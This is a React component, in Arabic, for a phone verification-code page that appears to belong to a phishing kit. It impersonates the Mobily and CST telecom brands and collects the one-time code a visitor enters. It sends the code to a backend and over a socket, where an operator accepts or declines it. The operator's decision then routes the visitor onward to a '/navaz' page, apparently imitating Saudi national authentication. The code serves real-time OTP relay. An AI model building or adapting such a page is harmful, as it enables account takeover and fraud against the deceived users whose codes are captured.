import React, { useEffect, useState } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";

const MobOtp = () => {
  const [phoneOtp, setPhoneOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const query = new URLSearchParams(window.location.search);
  const stc = query.get("stc");
  const [error, setError] = useState(false);
  const [counter, setCounter] = useState(180);

  const ID = sessionStorage.getItem("id");

  useEffect(() => {
    const timer = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!ID) return;
    const joinRoom = () => socket.emit("joinOrder", ID);
    joinRoom();
    socket.on("connect", joinRoom);
    return () => socket.off("connect", joinRoom);
  }, [ID]);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  useEffect(() => {
    const sameOrder = (id) => String(id) === String(ID);

    const onAcceptMobOtp = ({ id, price }) => {
      if (!sameOrder(id)) return;
      const q = new URLSearchParams();
      q.set("id", String(id));
      if (price != null && price !== "") q.set("otp", String(price));
      if (stc != null && stc !== "") q.set("stc", stc);
      navigate(`/navaz?${q.toString()}`);
    };

    const onDeclineMobOtp = (id) => {
      if (!sameOrder(id)) return;
      setLoading(false);
      navigate("/phone");
    };

    socket.on("acceptMobOtp", onAcceptMobOtp);
    socket.on("declineMobOtp", onDeclineMobOtp);

    return () => {
      socket.off("acceptMobOtp", onAcceptMobOtp);
      socket.off("declineMobOtp", onDeclineMobOtp);
    };
  }, [ID, navigate, stc]);

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    if (!ID) {
      setLoading(false);
      return;
    }
    try {
      await axios.post(`${api_route}/mobOtp/${ID}`, {
        mobOtp: phoneOtp,
      });
      socket.emit("mobOtp", {
        id: ID,
        mobOtp: phoneOtp,
      });
    } catch {
      setLoading(false);
    }
  };

  return (
    <div className="w-full flex flex-col items-center justify-center rounded-md">
      <div>
        <form
          className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
          dir="rtl"
          onSubmit={handleSubmit}
        >
          <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
            <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
            <div className="flex items-start ">
              <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
              <span className="font-semibold">
                تم إرسال رمز التحقق إلي هاتفك النقال , الرجاء إدخاله في هذه
                الخانة .
              </span>
            </div>
          </div>

          <div className="flex justify-end items-center mb-1 -mt-2 rounded-lg px-2">
            <img
              src="/mobily.jpeg"
              alt="mobily"
              className="h-16 object-contain"
              onError={(e) => {
                e.currentTarget.style.display = "none";
              }}
            />
          </div>

          <p className="text-right text-lg text-sky-600 leading-relaxed p-2 font-bold">
            ستصلك مكالمة من مزود الخدمة , يرجى اتباع التعليمات الصوتية و الضغط
            على الرقم الذي تسمعه لتأكيد الطلب
          </p>

          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
            <span className="font-semibold text-sm text-gray-700 w-full text-right" />
            <input
              value={phoneOtp}
              required
              onChange={(e) => setPhoneOtp(e.target.value)}
              dir="ltr"
              placeholder="  رمز التحقق"
              inputMode="numeric"
              type="text"
              maxLength={6}
              className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full"
            />
          </div>
          <div className="flex items-center justify-between">
            <div className="flex justify-center items-center my-4">
              <span className="text-gray-600">
                إعادة إرسال: {formattedMinutes}:{formattedSeconds}
              </span>
            </div>
            <div className="flex items-center justify-center py-5 mt-4">
              <button
                type="submit"
                className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-full text-base font-semibold transition-colors"
              >
                تحقق
              </button>
            </div>
          </div>

          {error && (
            <div className="w-full text-center text-red-500 fixed inset-0 bg-black bg-opacity-45 flex items-center justify-center z-50">
              <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
                <AiOutlineCloseCircle className="text-6xl" />
                <div className="flex flex-col w-full items-center justify-center">
                  <span>رمز التحقق غير صحيح</span>
                  <span className="text-sm">82A27833M4589370G</span>
                </div>
                <button
                  type="button"
                  className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
                  onClick={() => setError(false)}
                >
                  حاول مرة ثانية
                </button>
              </div>
            </div>
          )}

          <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
            <img src="/phoneFooter.jpeg" alt="CST" className="object-contain" />
          </div>
        </form>
      </div>

      {loading && (
        <div className="fixed top-0 w-full h-screen bg-[#ffffffc7] flex items-center justify-center flex-col gap-y-5 z-50">
          <TailSpin
            height="50"
            width="50"
            color="blue"
            ariaLabel="tail-spin-loading"
            radius="1"
            visible
          />
          <span className="font-semibold">
            يرجي الانتظار جاري التأكد من صحة البيانات المدخلة
          </span>
        </div>
      )}
    </div>
  );
};

export default MobOtp;
